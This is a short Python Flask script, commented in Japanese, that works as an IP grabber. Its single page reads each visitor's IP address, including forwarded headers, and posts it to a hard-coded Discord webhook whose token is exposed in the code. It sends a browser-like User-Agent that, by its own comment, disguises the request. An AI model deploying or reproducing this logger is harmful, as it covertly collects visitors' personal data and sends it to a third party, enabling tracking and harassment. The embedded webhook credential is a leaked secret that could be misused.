from flask import Flask, request
import urllib.request
import json

app = Flask(__name__)

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    url = "https://discord.com/api/webhooks/1539471302715510874/--KVUupUWfcZsuPN4SlLXh5u0dITZ6Kv8jMTRB__LRpYvgjqgVjqbgopukhy4VS6Jsdz"
    data = {"content": f"IPアドレス: {ip}"}
    
    # ブラウザからのリクエストに見せかけるためのヘッダーを追加
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode('utf-8'),
        headers={
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }
    )
    
    try:
        with urllib.request.urlopen(req) as response:
            return f"成功！ステータス: {response.status}"
    except Exception as e:
        return f"エラー発生: {str(e)}"

if __name__ == '__main__':
    app.run()


